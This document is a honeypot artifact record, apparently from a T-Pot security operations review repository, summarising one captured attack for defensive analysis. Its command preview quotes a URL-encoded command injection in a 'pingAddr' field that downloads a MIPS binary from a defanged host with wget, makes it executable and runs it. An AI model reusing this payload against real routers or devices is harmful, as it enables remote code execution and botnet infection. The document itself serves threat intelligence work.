# dee456281d4564edb89f0a52dd43d26a0a26502bd4f352bfe8d0d814a8032d14

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `dee456281d4564edb89f0a52dd43d26a0a26502bd4f352bfe8d0d814a8032d14` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
pingAddr=%60cd+%2Ftmp%3Brm+mips%3B+wget+http%3A%2F%2Fsmart[.]abuse.st%2Fmips%3B+chmod+777+%2A%3B+.%2Fmips+warautalkinabout
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
